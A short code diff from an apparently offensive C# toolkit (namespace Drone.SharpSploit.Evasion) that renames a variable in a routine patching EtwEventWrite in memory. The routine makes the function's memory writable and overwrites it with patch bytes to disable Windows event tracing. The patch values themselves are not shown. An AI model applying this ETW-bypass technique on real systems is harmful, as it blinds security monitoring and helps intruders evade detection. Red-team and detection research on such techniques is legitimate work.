@@ -16,13 +16,13 @@ namespace Drone.SharpSploit.Evasion
                 "EtwEventWrite",
                 true);
 
-            var pathBytes = Utilities.IsProcess64Bit ? X64Patch : X86Patch;
+            var patchBytes = Utilities.IsProcess64Bit ? X64Patch : X86Patch;
 
-            _original = new byte[pathBytes.Length];
+            _original = new byte[patchBytes.Length];
 
-            Marshal.Copy(_address, _original, 0, pathBytes.Length);
+            Marshal.Copy(_address, _original, 0, patchBytes.Length);
 
-            var size = (IntPtr)pathBytes.Length;
+            var size = (IntPtr)patchBytes.Length;
 
             var oldProtect = DInvoke.DynamicInvoke.Native.NtProtectVirtualMemory(
                 (IntPtr)(-1),
@@ -30,7 +30,7 @@ namespace Drone.SharpSploit.Evasion
                 ref size,
                  DInvoke.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE);
 
-            Marshal.Copy(pathBytes, 0, _address, pathBytes.Length);
+            Marshal.Copy(patchBytes, 0, _address, patchBytes.Length);
 
             _ = DInvoke.DynamicInvoke.Native.NtProtectVirtualMemory(
                 (IntPtr)(-1),
